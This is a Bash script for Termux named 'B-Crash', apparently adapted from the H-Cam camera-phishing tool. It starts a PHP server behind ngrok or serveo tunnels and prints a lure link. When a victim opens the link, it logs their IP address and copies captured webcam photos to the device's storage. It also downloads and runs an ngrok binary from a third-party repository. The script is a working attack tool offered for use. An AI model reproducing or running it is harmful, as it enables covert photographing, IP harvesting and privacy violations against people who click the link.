#!/bin/bash
trap 'printf "\n";stop' 2
setup () {
	clear
	printf "\033[92m [+] Requirements installing....\n\n"
	sleep 0.50
	apt update
	apt upgrade
	apt install curl
	apt install wget
	apt install openssh
	apt install php
	apt install toilet
	apt install python
	pip install lolcat
	apt install apache2
	ma
	check-ngrok
	cd ~/B-Crash
	echo "#!/data/data/com.termux/files/usr/bin/sh" >> $PREFIX/bin/bcrash
	echo "cd ~/B-Crash" >> $PREFIX/bin/bcrash
	echo "bash bc.sh" >> $PREFIX/bin/bcrash
	chmod 700 $PREFIX/bin/bcrash
	clear
	printf "\n\n \033[93m [√] You can start this command :- \033[96m bcrash\n\n"
	printf "Press enter to start B-Crash\n"
	read
	}
	zi () {
		cd ~/B-Crash
		if [ -e ngrok.zip ];then
		printf "\033[96m [√] Download complete\n"
		printf " [+] Unzip Ngrok.zip..\n"
		unzip ngrok.zip
		rm -f ngrok.zip
		chmod 700 ngrok
		printf "\n \033[96m [√] Successfully installed ngrok\n"
		else
		printf "\n\033[91m Any error not download !!\n\n"
		printf "Try again !!\n"
		read
		check-ngrok
		fi
		
		}
	check-ngrok () {
		cd ~/B-Crash
		if [ -e ngrok ];then
		echo
		else
		printf "\n\033[91m [×] Ngrok not found !!\n\n"
		printf "\033[92m [+] Downloading Ngrok......\n\n"
		wget https://github.com/rooted-cyber/upload/raw/master/ngrok.zip > /dev/null 2>&1
		
		zi
		fi
		}
	ma () {
		cd ~/B-Crash
		if [ -e bc.html ];then
		echo
		else
		unzip .a.zip
		fi
		}
		cd $PREFIX/bin
		if [ -e bcrash ];then
		echo
		else
		setup
		fi
		clear
banner() {
c="toilet -f term -F gay"
toilet -f mono12 -F metal B-Crash

printf " \e[1;96m v 2.0 Created by https://github.com/thelinuxchoice\e[0m \n"|lolcat --animate
echo
random
printf "     		This Tool Edited By Maruf \n"
printf "\n"
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "H-Cam needed php"; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
echo -e "\033[0m"
random
printf " Waiting to open link, Press Ctrl + C to exit...\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
echo -e "\033[0m"
random
printf "\n[√] Your Link Opened\n"
catch_ip
rm -rf ip.txt

fi
sleep 0.5

if [[ -e "Log.log" ]]; then
echo -e "\033[0m"
random
printf "\nReceived photo in internal storage\n"
rm -rf Log.log
echo
echo " Received image in /sdcard/H-Cam"
cd $HOME/H-Cam
cp -f cam* /sdcard/H-Cam
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;91m \n\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;94m[+]\e[92m Starting B-Crash \e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[+]\e[96m B-Crash link:\e[0m\e[1;77m %s\n' $send_link
sleep 1
echo

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' bc.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}
random () {
	cd ~/B-Crash
	python .color.py
	}
ngrok_server() {

cd ~/B-Crash
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://github.com/rooted-cyber/upload/raw/master/ngrok.zip > /dev/null 2>&1

if [[ -e ngrok.zip ]]; then
unzip ngrok.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok.zip
else
printf "\e[1;93m[!] Download complete \n \033[92m Run this command ngrok-hcam\e[0m\n"
exit 1
fi

else
wget https://github.com/rooted-cyber/upload/raw/master/ngrok.zip > /dev/null 2>&1

if [[ -e ngrok.zip ]]; then
unzip ngrok.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
echo -e "\033[0m"
random
printf " [>] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
cd ~/B-Crash
chmod 777 ngrok
./ngrok http 3333 > /dev/null 2>&1 &
sleep 7
echo -e "\033[0m"
random
printf " [>] Starting ngrok server...\n\n"
sleep 7
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
#printf "\e[1;92m[\e[0m*\e[1;92m] Your ngrok link:\e[0m\e[1;77m %s\e[0m\n" $link
random
printf " [√] "
sleep 0.2
printf "Y"
sleep 0.2
printf "o"
sleep 0.2
printf "u"
sleep 0.2
printf "r"
sleep 0.2
printf " "
sleep 0.2
printf "B-Crash "
sleep 0.1
printf "l"
sleep 0.1
printf "i"
sleep 0.1
printf "n"
sleep 0.1
printf "k"
sleep 0.1
printf ":- \033[0m%s" $link
sleep 1

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\033[91m			[\033[97m1\033[91m] \033[92mServeo\n"
printf "\033[91m			[\033[97m2\033[91m] \033[92mNgrok\n"
default_option_server="2"
read -p $'\n\e[93m ##> \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' H-Cam.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="hcam$RANDOM"

printf '[•] Select domain ?  (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m' | lolcat
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m hcam12\e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

